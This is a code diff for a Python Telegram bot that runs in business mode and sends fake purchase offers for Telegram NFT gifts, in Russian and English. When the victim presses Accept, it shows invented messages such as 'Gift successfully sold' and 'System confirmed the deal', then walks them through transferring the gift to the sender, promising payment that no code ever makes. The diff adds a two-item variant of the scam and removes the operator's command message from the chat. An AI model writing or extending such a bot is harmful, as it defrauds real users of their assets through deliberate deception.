@@ -23,7 +23,6 @@ TON_EMOJI_ID = "5406976471153545018"
 STAR_EMOJI = f'<tg-emoji emoji-id="{STAR_EMOJI_ID}">⭐</tg-emoji>'
 TON_EMOJI = f'<tg-emoji emoji-id="{TON_EMOJI_ID}">💎</tg-emoji>'
 
-# --- ФУНКЦИЯ ДЛЯ БЕЗОПАСНОГО УДАЛЕНИЯ ---
 async def safe_delete(chat_id, message_id, conn_id=None):
     if conn_id:
         try:
@@ -60,19 +59,33 @@ async def send_offer(message: Message):
     if len(parts) < 5:
         return
 
-    link = parts[1]
-    if not link.startswith("http"):
-        link = "https://" + link
+    is_double = parts[2].startswith("http") or parts[2].startswith("t.me")
 
-    amount = parts[2]
-    currency_raw = parts[3].lower()
-    lang = parts[4].lower()
+    if is_double:
+        link1 = parts[1]
+        link2 = parts[2]
+        amount = parts[3]
+        currency_raw = parts[4].lower()
+        lang = parts[5].lower() if len(parts) > 5 else "ru"
+        nft_count = 2
+    else:
+        link1 = parts[1]
+        link2 = None
+        amount = parts[2]
+        currency_raw = parts[3].lower()
+        lang = parts[4].lower() if len(parts) > 4 else "ru"
+        nft_count = 1
+
+    if not link1.startswith("http"):
+        link1 = "https://" + link1
+    if link2 and not link2.startswith("http"):
+        link2 = "https://" + link2
 
     if currency_raw not in ["stars", "ton", "gram"]:
         return
 
     if lang not in ["ru", "en"]:
-        return
+        lang = "ru"
 
     if currency_raw == "stars":
         currency_display = STAR_EMOJI
@@ -81,46 +94,57 @@ async def send_offer(message: Message):
     else:
         currency_display = "Gram"
 
-    nft_slug = link.rstrip("/").split("/")[-1]
-    nft_prefix, separator, nft_number = nft_slug.rpartition("-")
-    nft_name = f"{nft_prefix} #{nft_number}" if separator and nft_number.isdigit() else nft_slug
+    nft1_slug = link1.rstrip("/").split("/")[-1]
+    nft1_prefix, separator, nft1_number = nft1_slug.rpartition("-")
+    nft1_name = f"{nft1_prefix} #{nft1_number}" if separator and nft1_number.isdigit() else nft1_slug
+    nft1_link = f'<a href="{link1}">{nft1_name}</a>'
+    
+    nft2_link = ""
+    if link2:
+        nft2_slug = link2.rstrip("/").split("/")[-1]
+        nft2_prefix, sep2, nft2_number = nft2_slug.rpartition("-")
+        nft2_name = f"{nft2_prefix} #{nft2_number}" if sep2 and nft2_number.isdigit() else nft2_slug
+        nft2_link = f'<a href="{link2}">{nft2_name}</a>'
 
     sender_name = message.from_user.first_name
+    hidden_link = f'<a href="{link1}">&#8203;</a>'
 
-    nft_link = f'<a href="{link}">{nft_name}</a>'
-    hidden_link = f'<a href="{link}">&#8203;</a>'
-
-    if lang == "ru":
-        offer_text = (
-            f"<b>{sender_name} предлагает Вам {amount} {currency_display} за коллекционный предмет {nft_link}.</b>\n\n"
-            f"<i>Действует 5ч 59м.</i>\n"
-            f"{hidden_link}"
-        )
+    if nft_count == 1:
+        if lang == "ru":
+            offer_text = f"<b>{sender_name} предлагает Вам {amount} {currency_display} за коллекционный предмет {nft1_link}.</b>\n\n<i>Действует 5ч 59м.</i>\n{hidden_link}"
+        else:
+            offer_text = f"<b>{sender_name} offers you {amount} {currency_display} for the collectible {nft1_link}.</b>\n\n<i>Expires in 5h 59m.</i>\n{hidden_link}"
     else:
-        offer_text = (
-            f"<b>{sender_name} offers you {amount} {currency_display} for the collectible {nft_link}.</b>\n\n"
-            f"<i>Expires in 5h 59m.</i>\n"
-            f"{hidden_link}"
-        )
+        if lang == "ru":
+            offer_text = (
+                f"<b>Система подтвердила сделку.</b>\n\n"
+                f"<b>Покупатель {sender_name} предлагает Вам {amount} {currency_display} за коллекцию коллекционных предметов:</b>\n"
+                f"1. {nft1_link}\n"
+                f"2. {nft2_link}\n\n"
+                f"<i>Предложение действует ещё 5ч 59м.</i>\n"
+                f"{hidden_link}"
+            )
+        else:
+            offer_text = (
+                f"<b>System confirmed the deal.</b>\n\n"
+                f"<b>Buyer {sender_name} offers you {amount} {currency_display} for a collection of collectibles:</b>\n"
+                f"1. {nft1_link}\n"
+                f"2. {nft2_link}\n\n"
+                f"<i>Offer expires in 5h 59m.</i>\n"
+                f"{hidden_link}"
+            )
 
     keyboard = InlineKeyboardMarkup(inline_keyboard=[[
-        InlineKeyboardButton(
-            text="Отклонить" if lang == "ru" else "Decline", 
-            callback_data="decline",
-            icon_custom_emoji_id=CROSS_EMOJI_ID
-        ),
-        InlineKeyboardButton(
-            text="Принять" if lang == "ru" else "Accept", 
-            callback_data="accept_offer",
-            icon_custom_emoji_id=CHECK_EMOJI_ID
-        )
+        InlineKeyboardButton(text="Отклонить" if lang == "ru" else "Decline", callback_data="decline", icon_custom_emoji_id=CROSS_EMOJI_ID),
+        InlineKeyboardButton(text="Принять" if lang == "ru" else "Accept", callback_data="accept_offer", icon_custom_emoji_id=CHECK_EMOJI_ID)
     ]])
 
     last_offer_data = {
-        "nft_name": nft_name,
+        "nft_name": nft1_name if nft_count == 1 else f"Коллекция из 2 предметов",
         "amount": amount,
         "currency_display": currency_display,
-        "link": link,
+        "link": link1,
+        "link2": link2,
         "sender_username": message.from_user.username,
         "lang": lang,
         "business_connection_id": message.business_connection_id
@@ -135,12 +159,7 @@ async def send_offer(message: Message):
             text=offer_text,
             reply_markup=keyboard,
             business_connection_id=message.business_connection_id,
-            link_preview_options=LinkPreviewOptions(
-                url=link,
-                is_disabled=False,
-                prefer_large_media=True,
-                show_above_text=True
-            )
+            link_preview_options=LinkPreviewOptions(url=link1, is_disabled=False, prefer_large_media=True, show_above_text=True)
         )
         last_message_id = msg.message_id
         await safe_delete(message.chat.id, message.message_id, message.business_connection_id)
@@ -155,109 +174,90 @@ async def on_accept_offer(callback: CallbackQuery):
     amount = last_offer_data.get("amount", "0")
     currency_display = last_offer_data.get("currency_display", "Stars")
     link = last_offer_data.get("link", "")
+    link2 = last_offer_data.get("link2")
     conn_id = last_offer_data.get("business_connection_id")
     sender_username = last_offer_data.get("sender_username")
     lang = last_offer_data.get("lang", "ru")
 
-    nft_link = f'<a href="{link}">{nft_name}</a>'
     hidden_link = f'<a href="{link}">&#8203;</a>'
     target_account = f"@{sender_username}" if sender_username else "покупателю"
 
-    if lang == "ru":
-        new_text = (
-            f"<b>Подарок успешно продан {nft_link}.</b>\n\n"
-            f"<b>• Передайте подарок {target_account} для завершения сделки.</b>\n\n"
-            f"<b>После передачи подарка вам автоматически зачислятся {amount} {currency_display} на ваш баланс.</b>\n"
-            f"{hidden_link}"
-        )
-        btn_transfer = "Передать"
-        btn_how = "Как передать?"
+    if link2:
+        if lang == "ru":
+            new_text = (
+                f"<b>Система подтвердила сделку.</b>\n\n"
+                f"<b>• Передайте оба коллекционных предмета покупателю {target_account} для завершения сделки.</b>\n\n"
+                f"<b>После передачи подарков вам автоматически зачислятся {amount} {currency_display} на ваш баланс.</b>\n"
+                f"{hidden_link}"
+            )
+            btn_transfer = "Передать"
+            btn_how = "Как передать?"
+        else:
+            new_text = (
+                f"<b>System confirmed the deal.</b>\n\n"
+                f"<b>• Transfer both collectibles to {target_account} to complete the deal.</b>\n\n"
+                f"<b>After transferring the gifts, {amount} {currency_display} will be automatically credited to your balance.</b>\n"
+                f"{hidden_link}"
+            )
+            btn_transfer = "Transfer"
+            btn_how = "How to transfer?"
     else:
-        new_text = (
-            f"<b>Gift {nft_link} successfully sold.</b>\n\n"
-            f"<b>• Transfer the gift to {target_account} to complete the deal.</b>\n\n"
-            f"<b>After transferring the gift, {amount} {currency_display} will be automatically credited to your balance.</b>\n"
-            f"{hidden_link}"
-        )
-        btn_transfer = "Transfer"
-        btn_how = "How to transfer?"
+        nft_link = f'<a href="{link}">{nft_name}</a>'
+        if lang == "ru":
+            new_text = (
+                f"<b>Подарок успешно продан {nft_link}.</b>\n\n"
+                f"<b>• Передайте подарок {target_account} для завершения сделки.</b>\n\n"
+                f"<b>После передачи подарка вам автоматически зачислятся {amount} {currency_display} на ваш баланс.</b>\n"
+                f"{hidden_link}"
+            )
+            btn_transfer = "Передать"
+            btn_how = "Как передать?"
+        else:
+            new_text = (
+                f"<b>Gift {nft_link} successfully sold.</b>\n\n"
+                f"<b>• Transfer the gift to {target_account} to complete the deal.</b>\n\n"
+                f"<b>After transferring the gift, {amount} {currency_display} will be automatically credited to your balance.</b>\n"
+                f"{hidden_link}"
+            )
+            btn_transfer = "Transfer"
+            btn_how = "How to transfer?"
 
     new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(
-            text=btn_transfer, 
-            url="tg://settings/my-profile/gifts",
-            icon_custom_emoji_id=ENVELOPE_EMOJI_ID
-        )],
+        [InlineKeyboardButton(text=btn_transfer, url="tg://settings/my-profile/gifts", icon_custom_emoji_id=ENVELOPE_EMOJI_ID)],
         [InlineKeyboardButton(text=btn_how, callback_data="send_transfer")]
     ])
 
     await safe_delete(callback.message.chat.id, callback.message.message_id, conn_id)
-
     if last_message_id and last_message_id != callback.message.message_id:
         await safe_delete(callback.message.chat.id, last_message_id, conn_id)
 
     try:
-        msg = await bot.send_message(
-            chat_id=callback.message.chat.id,
-            text=new_text,
-            reply_markup=new_keyboard,
-            business_connection_id=conn_id,
-            link_preview_options=LinkPreviewOptions(
-                url=link,
-                is_disabled=False,
-                prefer_large_media=True,
-                show_above_text=True
-            )
-        )
+        msg = await bot.send_message(chat_id=callback.message.chat.id, text=new_text, reply_markup=new_keyboard, business_connection_id=conn_id, link_preview_options=LinkPreviewOptions(url=link, is_disabled=False, prefer_large_media=True, show_above_text=True))
         last_message_id = msg.message_id
     except Exception as e:
         print(f"Ошибка отправки: {e}")
-    
     await callback.answer()
 
-# --- ОБРАБОТЧИК "КАК ПЕРЕДАТЬ?" ---
+# --- ОСТАЛЬНЫЕ ОБРАБОТЧИКИ (КАК БЫЛИ) ---
 @dispatcher.callback_query(F.data == "send_transfer")
 async def on_send_transfer(callback: CallbackQuery):
     sender_username = last_offer_data.get("sender_username")
     lang = last_offer_data.get("lang", "ru")
     target_account = f"@{sender_username}" if sender_username else "покупателю"
-
-    if lang == "ru":
-        alert_text = (
-            f"1. Нажмите «Передать» под сообщением.\n"
-            f"2. Перейдите в «Мои подарки» и выберите NFT.\n"
-            f"3. Нажмите «Передать», выберите получателя и передайте подарок.\n\n"
-            f"Нет в контактах? Найдите по {target_account}"
-        )
-    else:
-        alert_text = (
-            f"1. Click «Transfer» under the message.\n"
-            f"2. Go to «My Gifts» and select the NFT.\n"
-            f"3. Click «Transfer», choose the recipient and transfer the gift.\n\n"
-            f"Not in contacts? Find by {target_account}"
-        )
-    
+    alert_text = f"1. Нажмите «Передать» под сообщением.\n2. Перейдите в «Мои подарки» и выберите NFT.\n3. Нажмите «Передать», выберите получателя и передайте подарок.\n\nНет в контактах? Найдите по {target_account}" if lang == "ru" else f"1. Click «Transfer» under the message.\n2. Go to «My Gifts» and select the NFT.\n3. Click «Transfer», choose the recipient and transfer the gift.\n\nNot in contacts? Find by {target_account}"
     await callback.answer(alert_text, show_alert=True)
 
-# --- ОБРАБОТЧИК "ОТКЛОНИТЬ" ---
 @dispatcher.callback_query(F.data == "decline")
 async def on_decline(callback: CallbackQuery):
     lang = last_offer_data.get("lang", "ru")
     try:
-        await callback.bot.delete_message(
-            chat_id=callback.message.chat.id,
-            message_id=callback.message.message_id
-        )
+        await callback.bot.delete_message(chat_id=callback.message.chat.id, message_id=callback.message.message_id)
     except Exception as e:
-        print(f"Ошибка удаления при отказе: {e}")
-    
-    if lang == "ru":
-        await callback.answer("Вы отклонили предложение.", show_alert=True)
-    else:
-        await callback.answer("You have declined the offer.", show_alert=True)
+        print(f"Ошибка удаления: {e}")
+    await callback.answer("Вы отклонили предложение." if lang == "ru" else "You have declined the offer.", show_alert=True)
 
 async def main():
-    print("Бот запущен (Business-режим).")
+    print("Бот запущен.")
     await dispatcher.start_polling(bot)
 
 if __name__ == "__main__":
